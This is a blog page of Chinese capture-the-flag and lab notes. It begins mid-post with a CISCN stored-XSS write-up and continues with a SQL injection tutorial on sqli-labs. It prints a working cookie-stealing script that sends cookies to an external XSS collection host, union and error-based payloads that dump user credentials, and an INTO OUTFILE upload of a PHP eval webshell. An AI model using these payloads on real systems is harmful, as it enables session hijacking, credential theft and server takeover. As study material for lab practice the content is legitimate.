<p><img src="https://img-blog.csdnimg.cn/20191202194719634.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<hr>
<p><strong>3.CISCN web2</strong></p>
<p>题目链接  <a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2" target="_blank" rel="noopener">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2</a></p>
<p>writeup链接：<a href="https://www.zhaoj.in/read-6100.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6100.html</a></p>
<p>看到投稿界面，很容易想到通过利用xss漏洞来把恶意脚本上传，这是典型的存储型xss。</p>
<p>试试在投稿界面写入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>。打开保存信息的页面，发现啥都没有。那我们可以看看这个保存页面的源代码，发现<br><code>&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;&quot;&gt;</code></p>
<p>在网上搜索了一下，content-security-policy指的是内容安全策略。其核心思想十分简单：网站通过发送一个 CSP 头部，来告诉浏览器什么是被授权执行的与什么是需要被禁止的。其被誉为专门为解决XSS攻击而生的神器。</p>
<p>回过来看，可以明白javascript脚本被禁了，所以我们没法直接上传javascript代码。具体研究一下发现被转码了。怎么能绕过？这里要用到HTML markup。把我们要上传的javascript代码转成markup,可以用python脚本来转成markup。</p>
<pre><code>in_str = &quot;(function(){window.location.href=&apos;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&apos;+escape((function(){try{return document.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;toplocation=&apos;+escape((function(){try{return top.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;cookie=&apos;+escape((function(){try{return document.cookie}catch(e){return&apos;&apos;}})())+&apos;&amp;opener=&apos;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&apos;&apos;}catch(e){return&apos;&apos;}})());})();&quot;

output = &quot;&quot;

for c in in_str:
output += &quot;&amp;#&quot; + str(ord(c))

print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)</code></pre><p>提交一下,同样利用xss平台获取cooike。访问时发现了页面让我们输入id名称，输入一下，发现报错，说明了这里可能是sql联合注入。利用sqlmap跑一下。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/12/02/xss/" data-id="ckh65nt0h000hjsv95eicsfix" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-新文档" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/10/22/新文档/" class="article-date">
  <time datetime="2019-10-22T06:54:32.862Z" itemprop="datePublished">2019-10-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><h2 id="0x01sql语句基础："><a href="#0x01sql语句基础：" class="headerlink" title="#0x01sql语句基础："></a>#0x01sql语句基础：</h2><p><strong>1.select语句</strong></p>
<p>格式：</p>
<p>select * from table（从table表中获取字段信息）</p>
<p> select * from table where (在满足where后的条件下查询字段信息)</p>
<p><strong>2.insert语句</strong></p>
<p>格式：</p>
<p>insert into table(field1,field2) values(value1,value2)</p>
<p><strong>3.update语句</strong></p>
<p>格式：</p>
<p>update table1 set field1=value1 where</p>
<p><strong>4.delete语句</strong></p>
<p>格式：</p>
<p>delete from table1 where</p>
<p><strong>5.order子句</strong></p>
<p>ORDER BY 语句用于根据指定的列对结果集进行排序。</p>
<p>ORDER BY 语句默认按照升序对记录进行排序</p>
<p>如果想要把结果集按照倒序，则需要加上desc关键字</p>
<p>在sql注入中经常利用order by子句显示目标有多少字段</p>
<p><strong>6.and和or运算符</strong></p>
<p>AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。</p>
<p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。</p>
<p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p>
<p>and 和 or的用处在万能密码中就可以体现出来：</p>
<pre><code>Select * from admin where username=’admin’ and password=’’ or 1=1</code></pre><p>在sql语句中，and的优先级是大于or的。username=’admin’的条件（1）为真，password=’’的条件（2）是假的<br>那么1 and 2=false，在与第三个条件 1=1（3）为真 进行 false or 3=true，结果就是真。 所以，有时候在执行sql注入，执行的语句后就会加上 or 1=1，目的就是利用sql and 和 or 运算符的优先级的差别，来达到用户想要的目的（语句为真，执行输入的语句）</p>
<h2 id="0x02什么是sql注入"><a href="#0x02什么是sql注入" class="headerlink" title="#0x02什么是sql注入?:"></a>#0x02什么是sql注入?:</h2><pre><code>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</code></pre><p>简单的说就是网页的后台没有对用户发送的语句（以参数的方式传递）进行过滤，使得用户发送的语句直接被sql解释器执行。</p>
<h2 id="0x03原理分析："><a href="#0x03原理分析：" class="headerlink" title="#0x03原理分析："></a>#0x03原理分析：</h2><p>我们可以利用DVWA平台去分析sql注入的原理，DVWA的平台搭建和sqli-labs和upload-labs类似，首先需要php运行环境。把下载的文件夹放到网站根目录（WWW）。</p>
<pre><code>&lt;?php

if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
    // Get input
    $id = $_REQUEST[ &apos;id&apos; ];

    // Check database
    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;
    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row[&quot;first_name&quot;];
        $last  = $row[&quot;last_name&quot;];

        // Feedback for end user
        $html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
    }

    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
}

?&gt;</code></pre><p><img src="/%E6%8D%95%E8%8E%B73.png" alt></p>
<p>如果用户在userid文本框输入ID，输入的语句就会作为id参数的值通过GET(POST)方法提交到后台。通过sql解释器执行，并返回数据库查询的结果。也就是说，如果id传入的不只是一个数字，而是一条语句那么id的值就会被sql解释器执行。例如，用户令id=1’ and 1=1 order by 4 #,那么$query就会变成</p>
<pre><code>$query=&quot;SELECT first_name,last_name FROM users WHERE user_id=&apos;1&apos; and 1=1 order by 4#&quot;</code></pre><p>这样就能查询数据库信息了</p>
<h1 id="0x05sqli-labs"><a href="#0x05sqli-labs" class="headerlink" title="0x05sqli-labs"></a>0x05sqli-labs</h1><hr>
<p>sqli-labs是基于php环境的平台，使用前需要安装php集成环境（php+apache+mysql,部分关卡需要tomcat+java+mysql）。</p>
<p>sqli-labs下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
<p>这里还有一个sqli-labs原作者的教程：<a href="https://www.bilibili.com/video/av24783387?t=69" target="_blank" rel="noopener">https://www.bilibili.com/video/av24783387?t=69</a></p>
<p><strong>下面结合sqli-labs上的一些基础题目来介绍一些简单的sql注入方式。</strong></p>
<h1 id="0x06less01-联合查询"><a href="#0x06less01-联合查询" class="headerlink" title="0x06less01(联合查询)"></a>0x06less01(联合查询)</h1><hr>
<p>在了解题目要求之前，我们先来认识一下sql语句中union操作符。</p>
<p>union操作符的作用是合并多个select语句的结果集，但是使用union时，要保证union操作符内部的select语句要有相同的列</p>
<p>具体语法：</p>
<pre><code>select column1 from table1 union select column2 from table2</code></pre><p>注意：union操作符是不会返回相同的值。</p>
<p>union all</p>
<p>作用与union类似，都是合并多个select语句的结果集，但是可以返回重复的值。</p>
<p>题目要求：让用户上传一个参数’id’。</p>
<p><strong>1.判断注入点</strong></p>
<p>首先我们要找到注入点，判断注入点的常用方法之一就是在参数后加上一个单引号或双引号（因为sql语句添加引号会影响到sql语句的闭合，从而报错），如果报错，就可能存在注入点。当然，手工判断注入点的方法还有利用and运算符（and 1=1,and 1=2 ,and ‘1’=1）,利用特殊字符报错等等，在这里，就不详细介绍了。</p>
<p>通过尝试可以发现添加单引号后页面会有报错信息，说明页面存在注入点。</p>
<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85MjE2NjMxLWY1NTlmNDUyMmUyYjQ0ZjMucG5n?x-oss-process=image/format,png" alt></p>
<p>接下来就可以构造?id= 1’ ****语句实现注入了。</p>
<p><strong>2.使用 order by子句判断数据库的列数</strong></p>
<p>前面已经介绍了order by子句的作用，当order by子句后面的数字大于当前数据库的列数，语句就会出错。</p>
<p>输入id=1’ order by 4–+发现页面返回信息 “unknown columns ‘4’” 说明当前数据库的列数是小于4的。</p>
<p><img src="https://img-blog.csdnimg.cn/20191005170005919.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>输入id=1’ order by 3–+发现页面返回了用户的name password 说明当前数据库的列数刚好等于3，下面就可以构造 select 1，2，3 ***** 来获取数据库的相应信息了。</p>
<p><strong>3.利用 information_schema库</strong></p>
<p>如果继续学习sql注入就会发现select语句经常会用到information_schema这个库来获取数据库的（表，列，字段）的信息。information_schema是mysql自带的数据库，只要用户安装了mysql，在安装的同时，information<br>_schema这个数据库就会安装到用户的系统中.</p>
<p>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。也就是说information_schema中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。因此，在sql注入中就可以利用information_schema这个库获取其他数据库的信息.</p>
<p>SCHEMATA表:</p>
<p>SCHEMATA 表存储了 Mysql 数据库中所有库相关的信息，比如订单库、用户库这种不同的库。可以在mysql命令行中使用下述语句进行查看：</p>
<p>select * from information_schema.schemata;</p>
<p>TABLES表:<br>TABLES 表存储了 Mysql 数据库中表的信息。会记录这张表是属于哪个数据库(TABLE_SCHEMA)，是做什么的表(表注释)，多会创建的(CREATE_TIME)，有多少行数据(INDEX_LENGTH)等信息。</p>
<p>select* frominformation_schema.TABLES;</p>
<p>COLUMNS表:</p>
<p>COLUMNS 表存储了 Mysql 数据库中每张表中的列信息。会记录这列是属于哪张表(TABLE_NAME)、以及哪个库(TABLE_SCHEMA)、这列的数据类型是什么、列的注释(COLUMN_COMMENT)等信息。</p>
<p>select* frominformation_schema.COLUMNS<br>COLUMNS 表中字段 COLUMN_COMMENT 是关于列的注释信息，一般会标明这个列是什么字段，不同的数字代表什么含义(0代表什么、1代表什么)。</p>
<p><strong>4.开始注入</strong></p>
<p>获取数据库的名字:</p>
<pre><code>?id=-1&apos; union select 1,group_concat(schema_name),3 from information_schema.schemata--+//group_concat()函数是把一组中的非NULL字符串合并为一个字符串的函数</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005181042833.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>获取security数据库的表名:</p>
<pre><code>?id=-1&apos; union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema=&apos;security&apos;--+</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005190150598.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>获取users表的列:</p>
<pre><code>?id=-1&apos; union select 1,group_concat(column_name),3 from infromation_schema.columns where  table_name=&apos;users&apos;--+</code></pre><p><img src="https://img-blog.csdnimg.cn/2019100519070977.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<p>获取username ,password:</p>
<pre><code>?id=-1&apos; union select 1,group_concat(concat_ws(&apos;:&apos;,username,password)),3 from users--+//concat_ws函数是把一组非NULL字符串拼接为一个字符串，与concat函数相比主要不同是可以一次指定分隔符</code></pre><p><img src="https://img-blog.csdnimg.cn/20191005190933714.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
<h2 id="0x07less05报错注入"><a href="#0x07less05报错注入" class="headerlink" title="#0x07less05报错注入"></a>#0x07less05报错注入</h2><p>这关如果直接用联合查询的话,页面只会返回”You are in”,而不能返回数据库的信息。这时我们就可以尝试别的方法,比如时间注入,报错注入,布尔注入等等。在这一关可以使用报错注入来返回数据库的信息。</p>
<p><strong>1报错注入的原理:</strong></p>
<p>正常用户访问服务器发送id信息返回正确的id数据。报错注入是想办法构造语句，让错误信息中可以显示数据库的内容；如果能让错误信息中返回数据库中的内容，即实现SQL注入。</p>
<p><strong>2.利用group by和rand()的冲突直接报错注入</strong></p>
<p>group by的作用和order by的作用类似,都是对结果集排序(默认升序).而rand()是产生随机数的函数,类似于java的Math.random()。产生一个[0,1)区间的数.如rand()*2,则产生一个[0,2)区间的数。当rand() 和order by 在一起使用时，就会发生冲突。</p>
<p>由于rand和order+by的冲突，即rand()是不可以作为order by的条件字段,同理 也不可以为group by的条件字段。floor(rand(0)*2) 获取不确定又重复的值造成mysql的错误</p>
<p>rand和group by冲突的具体原因</p>
<p><strong>3.开始注入</strong></p>
<p>获取数据库的名字：</p>
<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select database()),&apos;:&apos;,floor(rand()*2))a from information_schema.schemata group by a--+//</code></pre><p>其中concat函数的作用和之前group_concat()函数类似也是把一组非NULL字符串拼接为一个字符串。a是 as a的别名。然后返回值不能超过1行数据，所以如果里面的select获取的是多行数据时要加limit（查询多组用limit选择）</p>
<p>获取表：</p>
<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 0,1),&apos;:&apos;,floor(rand(0)*2))a from information_schema.tables  group by a--+</code></pre><p>获取列：</p>
<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select column_name  from   information_schema.columns where table_name=&apos;users&apos;limit 0,1),&apos;:&apos;,floor(rand(0)*2))a from   information_schema.columns  group by a--+</code></pre><p>获取username， password:</p>
<pre><code>?id=1&apos; union select 1,count(*),concat(&apos;:&apos;,(select concat_ws(&apos;`&apos;,username,password) from users limit 0,1),&apos;:&apos;,floor(rand(0*2))) a from users group by a--+</code></pre><p>有关报错注入的方法还有很多，这里就不详细介绍了。</p>
<h2 id="0x08less07上传一句话木马"><a href="#0x08less07上传一句话木马" class="headerlink" title="#0x08less07上传一句话木马"></a>#0x08less07上传一句话木马</h2><p>先在id=1后加上单引号和双引号，页面都显示正常，但是在参数后加上注释，会报错，说明系统过滤注释符。并且sql语句id参数前后很有可能加了（），尝试了很多次发现构造:“id’ =1 ))”,可以使注释不被过滤。</p>
<p><img src="https://img-blog.csdnimg.cn/20191009171549118.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt><br>但是之后尝试 union,报错注入发现不能返回需要的信息（可以用布尔和时间盲注）。不过，本题提示利用file权限向服务器传入文件。那么，先看看是否能传入<br>构造语句：<br><a href="http://localhost/sqli-labs-master/Less-7/?id=1’" target="_blank" rel="noopener">http://localhost/sqli-labs-master/Less-7/?id=1’</a>)) and (select count(*) from mysql.user)&gt;0–<br>返回正常说明我们有这个权限.<br><img src="https://img-blog.csdnimg.cn/20191009172804632.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt><br>然后把一句话木马发送到网页，构造语句：id=-1’)) union select 1,2,”&lt;?php</p>
<p>@eval($_POST[‘shell’])?&gt; into outfile “<strong><strong>* \test.php” (**</strong></strong>为网页的目录,test.php为上传的一句话木马文件）。<br>连上中国菜刀，发现能够连接成功，说明注入成功（网页根目录有一句话木马说明上传成功）。</p>
<h2 id="0x09"><a href="#0x09" class="headerlink" title="#0x09"></a>#0x09</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/10/22/新文档/" data-id="ckh65nt0p000ljsv9o889mqod" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/06/JAVA处理JSON数据的实现与注意事项/">JAVA处理JSON数据的实现与注意事项</a>
          </li>
        
          <li>
            <a href="/2020/10/07/flutter与spring-boot交互获取session/">flutter与spring boot交互获取session</a>
          </li>
        
          <li>
            <a href="/2020/09/06/new-post/">new post</a>
          </li>
        
          <li>
            <a href="/2020/09/06/springboot分页-pageable作参数以及List转换为Page/">springboot分页 pageable作参数以及List转换为Page</a>
          </li>
        
          <li>
            <a href="/2020/08/31/vue-element-admin用户登录流程/">vue-element-admin用户登录流程</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>